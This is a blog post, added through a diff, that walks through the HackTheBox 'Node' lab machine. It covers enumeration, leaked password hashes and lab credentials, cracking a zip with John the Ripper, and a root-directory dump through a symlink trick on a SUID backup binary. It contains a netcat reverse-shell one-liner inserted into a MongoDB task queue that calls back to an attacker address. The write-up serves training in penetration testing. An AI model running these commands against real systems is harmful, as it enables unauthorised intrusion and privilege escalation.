@@ -1,0 +1,156 @@
+---
+layout: post
+title:  "HackTheBox - Node"
+date:   2021-09-21 17:06:25
+categories: Pentesting
+---
+
+# ENUMERATION
+
+```
+PORT     STATE SERVICE            REASON  VERSION
+22/tcp   open  ssh                syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwesV+Yg8+5O97ZnNFclkSnRTeyVnj6XokDNKjhB3+8R2I+r78qJmEgVr/SLJ44XjDzzlm0VGUqTmMP2KxANfISZWjv79Ljho3801fY4nbA43492r+6/VXeer0qhhTM4KhSPod5IxllSU6ZSqAV+O0ccf6FBxgEtiiWnE+ThrRiEjLYnZyyWUgi4pE/WPvaJDWtyfVQIrZohayy+pD7AzkLTrsvWzJVA8Vvf+Ysa0ElHfp3lRnw28WacWSaOyV0bsPdTgiiOwmoN8f9aKe5q7Pg4ZikkxNlqNG1EnuBThgMQbrx72kMHfRYvdwAqxOPbRjV96B2SWNWpxMEVL5tYGb
+|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKQ4w0iqXrfz0H+KQEu5D6zKCfc6IOH2GRBKKkKOnP/0CrH2I4stmM1C2sGvPLSurZtohhC+l0OSjKaZTxPu4sU=
+|   256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5cgCL/RuiM/AqWOqKOIL1uuLLjN9E5vDSBVDqIYU6y
+3000/tcp open  hadoop-tasktracker syn-ack Apache Hadoop
+| hadoop-datanode-info: 
+|_  Logs: /login
+| hadoop-tasktracker-info: 
+|_  Logs: /login
+|_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: MyPlace
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+Directory scan (I could not bruteforce with gobuster, because it was blacklisted as we later saw in the script)
+
+```s
+feroxbuster -u http://10.10.10.58:3000/ -w /usr/share/wordlists/dirb/common.txt  -x js,html
+```
+We get this folder and visit it:
+
+```
+http://10.10.10.58:3000/assets/js/app/controllers/profile.js
+```
+And here it is that we get the credentials of 4 users, so we log in via the admin account and download the backup file:
+
+```json
+    
+0    
+_id    "59a7365b98aa325cc03ee51c"
+username    "myP14ceAdm1nAcc0uNT"
+password    "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af"
+is_admin    true
+1    
+_id    "59a7368398aa325cc03ee51d"
+username    "tom"
+password    "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240"
+is_admin    false
+2    
+_id    "59a7368e98aa325cc03ee51e"
+username    "mark"
+password    "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73"
+is_admin    false
+3    
+_id    "59aa9781cced6f1d1490fce9"
+username    "rastating"
+password    "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0"
+is_admin    false
+```
+
+# FOOTHOLD
+
+The backup file was an encrypted zip file so we cracked it using John the Ripper.
+
+```s
+┌──(kali㉿MaskdMafia)-[~/Downloads]
+└─$ john hash --show                                     
+file:magicword::file:var/www/myplace/node_modules/qs/.eslintignore, var/www/myplace/node_modules/serve-static/README.md, var/www/myplace/package-lock.json:file
+
+1 password hash cracked, 0 left
+```
+We find this in the app.js and this turns out to be the credentials to SSH:
+
+```js
+const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
+const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
+```
+On searching more we see that one task is being executed by tom using /usr/bin/node which is a file named scheduler , so from there we get the database credentials and connect to it via mongodb and we find out that we can insert tasks to be executed. So we insert a reverse shell:
+
+```js
+> db
+scheduler
+> use scheduler
+switched to db scheduler
+> show collections
+tasks
+> db.tasks.find()
+> db.tasks.insert({_id:10, cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 1337 >/tmp/f"})
+WriteResult({ "nInserted" : 1 })
+```
+This promptly gives us a shell as user tom in our listener in another terminal:
+
+```s
+┌──(kali㉿MaskdMafia)-[~/Downloads]
+└─$ nc -lnvp 1337           
+listening on [any] 1337 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.10.58] 38004
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+```
+Now we can grab user.txt
+
+# PRIVILEGE ESCALATION
+
+Running Linpeas.sh shows us that we have an unidentified SUID binary /usr/local/bin/backup  which is going to show us the base64 form of the directory after zipping it up, and it has some blacklisted directoried such as /root and /etc
+
+So we create a new directory called new in /tmp and create a symlink of /root to the /tmp/new directory.
+
+```s
+tom@node:/tmp$ ln -s /root ./new
+```
+Then we run the backup script (We find the format from the earlier backup directory we had downloaded as admin from the website):
+
+```s
+/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/new
+
+UEsDBAoAAAAAAKisNVMAAAAAAAAAAAAAAAAIABwAdG1wL25ldy9VVAkAA3tCSmG8QkphdXgLAAEE6AMAAAToAwAAUEsDBAoAAAAAABwWO0sAAAAAAAAAAAAAAAANABwAdG1wL25ldy9yb290L1VUCQADhwPLWbxCSmF1eAsAAQQAAAAABAAAAABQSwMEFAAJAAgA0YMRR3+wrmSDAAAAlAAAABUAHAB0bXAvbmV3L3Jvb3QvLnByb2ZpbGVVVAkAAxn+0VWusWBadXgLAAEEAAAAAAQAAAAAX0S4zefK0+rhqV6sVGCQ6d3uCWXbxSCiy/DrWqincXTIdZmtajJ6CbmheLBT5YpMhWxBrTQj4hMOjESK4OodTmaPclSTPdavnCBW5u4reKuY34R2KvQw5WZoj4MyMWiYcCw5NWxMiHy11WfAwExQljEfsJro28nOXz1Ml4md+/4hTXBQSwcIf7CuZIMAAACUAAAAUEsDBBQACQAIABwWO0vcUmUcTQAAAFUAAAAaABwAdG1wL25ldy9yb290Ly5iYXNoX2hpc3RvcnlVVAkAA4cDy1musWBadXgLAAEEAAAAAAQAAAAApJFS8Lq787gQOoiayN3TUGTvjcuCjqKNClJvbOW0Ru2QzvTElk1z2nwWUyvaS3Bv76SOpJcwg2aTOmE1J5UZAR03uQPXkw1hClX2YsJQSwcI3FJlHE0AAABVAAAAUEsDBAoAAAAAADR8I0sAAAAAAAAAAAAAAAAUABwAdG1wL25ldy9yb290Ly5jYWNoZS9VVAkAA8MSrFm8QkphdXgLAAEEAAAAAAQAAAAAUEsDBAoACQAAADR8I0sAAAAADAAAAAAAAAAoABwAdG1wL25ldy9yb290Ly5jYWNoZS9tb3RkLmxlZ2FsLWRpc3BsYXllZFVUCQADwxKsWcMSrFl1eAsAAQQAAAAABAAAAADcP2Dbny4pcg+tokZQSwcIAAAAAAwAAAAAAAAAUEsDBAoACQAAANR9I0vyjjdALQAAACEAAAAVABwAdG1wL25ldy9yb290L3Jvb3QudHh0VVQJAAPQFaxZ2UFKYXV4CwABBAAAAAAEAAAAAIqNz/+l6jQKwhKQ4ABkKwkAnCSA84P8O3Qzs3Jr2My4oHSfbaBGIe+EgAo8EVBLBwjyjjdALQAAACEAAABQSwMEFAAJAAgA65FWR73lED6bBQAAIgwAABQAHAB0bXAvbmV3L3Jvb3QvLmJhc2hyY1VUCQADqRkpVq6xYFp1eAsAAQQAAAAABAAAAABr6hfrtwe878Np3cVTmjgvRhGURRlaj3lBD6VixEtJuMCjxq5OFX4905/frAuT+62X2KLUtskxe3oZQKhsUw3XMscksJB5GGPAF5+wLbJND3rWGI+ZhUv9LmcTHlUHTL0rnK79gd/jRCwfGEdb5ilysYJTLnxv7bDDYg5wnq3k56XHy/OCmMmj0E13ZKW4KYHnJvruTZrANVfHKuG7NCvzupVFtUduQq8XWU6QNsGjGV8w8r7iy7wowh9i7WkuwYcoMpI978lZZhB1mH71SDlzfbRH9HE0mS86cThCP2qj002+hyCiQBkhs3LxBOgX/fOsACL0K+k824n4NeAKZmunp8sK7SnTkh6K+KZFZMwc5gV9OC/SgYTH33lOJ55860ZDMOCcmhqJg34A3u3TCsBdRVEzOSrOf16vW9S0S/ddM7hR6udN3s95r0TNekH5tv1MbVtVGUmkhkQe7YBHnE+ix4M2eQcqCoKCtYbX8GPyUEZhmoxWCihqMTnEg/cSKnGi+zGIl8O5q4zElfma18Sr/KDsl5AT0ptyadEw5tUXw3kBnS2NADpZ+/BLYD8H9iUuWdff20AVSwYH3jtjf6KcmaEh7iutikU+ElC19p2ygMi/4IP3a6uVzCE9C77kb/c+KnOX23aP5QbxwXYRUjOvmSoOqmbBTsKZqbaEnnRJtnB+c9mKwVaMK7f2MLFlZuZ7vtmfdA3yxs9OtuaLN0/EAI8knML9wec3VpbAHNXqlXh49VKE9yunUgz84uo4hhRBAhQrvom2ivm7fDr9kLIYfslUk5SLi/0GofxDMaebSNlL6sVOoY7z59S8yzRCLh/gKeXe3v5T/e5ptxPlW+eFhzHQ4HhS4maNsl3slKyo3RqJUa7ZDbep5icM9irjyTdNSJkWRpKowacGi5mbwXAh52g02EsbWEu9dKpfZQmcAP1kRB9lILMoVx2c8JPbhZ3ZksBBnmLPXM38yu9RsnFjbAykH0Ffpq7oa4XZKKSzqXgvGGjcG7tVRxseS1vd0xMXhtbeh3ymhPS6+gGTVGhILOGMnnc9OILjCoDYVVdpNbL8ZUMccNzakOnoA/+2itPgkvPGRr+DRvkkhZDyGzm2qS3EZ0BZ0ZHqpe+tc9YhJWcI7D8DQrzsmz4iICJaxh2t7vUXtK81OhhHvx0hoQnIV5uy4BvxMZHYsQ+67guy9kWHGbfkOZwNVqnRN6XKw9lwBeXbQfCZhsZPd4uXIALOaMOAMUEiQFKtvA+VhwvEd2gWxd1hIV2NZPPB4y7P1n5bljkn35CajRcs/U+BKLOgFamBmIaSh4WzbF3IIg0m5JeGqwdwnIawxswEJcohBgNBuKZ3uNQOW1PpU6Td1HEL3CYGLbrG3Z2Mv5k1SbWOD9M+hg1qqRb9Aw78w3PqI9OcDA4fIm3Q+1NEpKAwPKssyIuOKnfIdRAzxc9BbyKpQyxUqNEKpE7CxneS0Vs+u6i/bFHfNkJpLHQ07XTH1MxYEIqK5oxMSV9ARxaonVHIIEa1dU0K0li09pdJVq4nXRJH68TFKRy57lkANm52eTysBHYaIYfHes8Ua089aYtj/rrR+K12EZHcw9zlVc2RCJbbVjoKoQPnL4ao2Rs2uxeKlbId8Tv8BovSJ3zUTX1AI2OIOfc95wUjZJmwQLc/U2yD7NSyYsJe0ASFNw9F2OFduEIBTVX4A6XbJ/DVlYNMGAm8H8SargaRBcsL/nQa9wMAmzawjK8nIiWMi2uB2kpoJc1fH3Zre8nRyHUhCa6DPIsKhUmsC6QPtwlFDjfqB3TBwiJupGaHGQ2J2QBySnYhYLWs01sogj2JK7zU6ryDhhv0bEENW5op1J/tKD1CmpyfFlmEEWhLah1xxrBqrGIuGSO9SjM1YtopTb4N9cl1uGU9BUzqGVt1lodcUEsHCL3lED6bBQAAIgwAAFBLAwQUAAkACADCATtL/KO9uKEBAAB5AwAAFQAcAHRtcC9uZXcvcm9vdC8udmltaW5mb1VUCQADO9/KWTvfyll1eAsAAQQAAAAABAAAAAC/fpmwwPdMqlMbyaALyL4NxocgrROi71eF5qd4n5Sid5pBuDJf591cpBOial4KchcIaywxWUl+cAX82oO32EPJgT2BrlYMAt2GmblabsKT5OnCB2v0F/sFIK7BBtOeHT5zhy0tLL9s89TPHlojkrIkCwLvaOXRWWs1Y39aWMou99wRZe7HgwpR1cZZhLZPC98/DiDw+VOtIAMt6eIirkixo2mzfvxcI691eH0PCt3+K+2AtAluiZOCfRHVoBFWCnadvV0j3K7T0Qw3pjHCcVxgohmrf1E2Dq4wLpD7ZSb7NxcsTZFVEZYqHibj52qb4X2on/hwHRv/nWamjj76SQejYOp2Sbr0AT9SONKk3tIhgCys9T9zRND7TPculu4dK5A/SFkWsq0oyXIyOs9/hPaIb+N4j9ykaQZwjrtxiYhDLOTn9ww6bLTcCXKnvFEdiNr9krsc7DE8ibewTEdaX3E8jYLgGc3YKCbYN+u286bh0rVBpaMK0mSKi6C/XA1de8PJoFRXM3YKMfTWTxWsGXiyAzIttQxiz/jC/zHktPmQ1ulQSwcI/KO9uKEBAAB5AwAAUEsDBAoAAAAAAJiAI0sAAAAAAAAAAAAAAAATABwAdG1wL25ldy9yb290Ly5uYW5vL1VUCQADEBqsWbxCSmF1eAsAAQQAAAAABAAAAABQSwMECgAJAAAAxko7S9ntHzwTAAAABwAAACEAHAB0bXAvbmV3L3Jvb3QvLm5hbm8vc2VhcmNoX2hpc3RvcnlVVAkAA7Nfy1mgX8tZdXgLAAEEAAAAAAQAAAAA/6MrlqWSX+f2w9oHuh+z1GoQNVBLBwjZ7R88EwAAAAcAAABQSwECHgMKAAAAAACorDVTAAAAAAAAAAAAAAAACAAYAAAAAAAAABAA7UEAAAAAdG1wL25ldy9VVAUAA3tCSmF1eAsAAQToAwAABOgDAABQSwECHgMKAAAAAAAcFjtLAAAAAAAAAAAAAAAADQAYAAAAAAAAABAAwEFCAAAAdG1wL25ldy9yb290L1VUBQADhwPLWXV4CwABBAAAAAAEAAAAAFBLAQIeAxQACQAIANGDEUd/sK5kgwAAAJQAAAAVABgAAAAAAAEAAACkgYkAAAB0bXAvbmV3L3Jvb3QvLnByb2ZpbGVVVAUAAxn+0VV1eAsAAQQAAAAABAAAAABQSwECHgMUAAkACAAcFjtL3FJlHE0AAABVAAAAGgAYAAAAAAABAAAAgIFrAQAAdG1wL25ldy9yb290Ly5iYXNoX2hpc3RvcnlVVAUAA4cDy1l1eAsAAQQAAAAABAAAAABQSwECHgMKAAAAAAA0fCNLAAAAAAAAAAAAAAAAFAAYAAAAAAAAABAAwEEcAgAAdG1wL25ldy9yb290Ly5jYWNoZS9VVAUAA8MSrFl1eAsAAQQAAAAABAAAAABQSwECHgMKAAkAAAA0fCNLAAAAAAwAAAAAAAAAKAAYAAAAAAAAAAAApIFqAgAAdG1wL25ldy9yb290Ly5jYWNoZS9tb3RkLmxlZ2FsLWRpc3BsYXllZFVUBQADwxKsWXV4CwABBAAAAAAEAAAAAFBLAQIeAwoACQAAANR9I0vyjjdALQAAACEAAAAVABgAAAAAAAEAAACggegCAAB0bXAvbmV3L3Jvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwECHgMUAAkACADrkVZHveUQPpsFAAAiDAAAFAAYAAAAAAABAAAApIF0AwAAdG1wL25ldy9yb290Ly5iYXNocmNVVAUAA6kZKVZ1eAsAAQQAAAAABAAAAABQSwECHgMUAAkACADCATtL/KO9uKEBAAB5AwAAFQAYAAAAAAAAAAAAgIFtCQAAdG1wL25ldy9yb290Ly52aW1pbmZvVVQFAAM738pZdXgLAAEEAAAAAAQAAAAAUEsBAh4DCgAAAAAAmIAjSwAAAAAAAAAAAAAAABMAGAAAAAAAAAAQAO1BbQsAAHRtcC9uZXcvcm9vdC8ubmFuby9VVAUAAxAarFl1eAsAAQQAAAAABAAAAABQSwECHgMKAAkAAADGSjtL2e0fPBMAAAAHAAAAIQAYAAAAAAABAAAAgIG6CwAAdG1wL25ldy9yb290Ly5uYW5vL3NlYXJjaF9oaXN0b3J5VVQFAAOzX8tZdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAALAAsA9AMAADgMAAAAAA==
+```
+We copy the base64 text and put it in our machine and decode it from base64 and unzip the resulting zip file to get the contents of the root directory:
+
+```s
+┌──(kali㉿MaskdMafia)-[~/Downloads/dirty_sock/tmp/hello]
+└─$ cat root |base64 -d > root1
+                                                                              
+┌──(kali㉿MaskdMafia)-[~/Downloads/dirty_sock/tmp/hello]
+└─$ unzip root1 
+Archive:  root1
+   creating: tmp/new/
+   creating: tmp/new/root/
+[root1] tmp/new/root/.profile password: 
+  inflating: tmp/new/root/.profile   
+  inflating: tmp/new/root/.bash_history  
+   creating: tmp/new/root/.cache/
+ extracting: tmp/new/root/.cache/motd.legal-displayed  
+ extracting: tmp/new/root/root.txt   
+  inflating: tmp/new/root/.bashrc    
+  inflating: tmp/new/root/.viminfo   
+   creating: tmp/new/root/.nano/
+ extracting: tmp/new/root/.nano/search_history  
+                                                                              
+┌──(kali㉿MaskdMafia)-[~/Downloads/dirty_sock/tmp/hello]
+└─$ cd tmp/new/root            
+                                                                              
+┌──(kali㉿MaskdMafia)-[~/…/hello/tmp/new/root]
+└─$ ls
+root.txt
+```
+Now we can get root.txt 
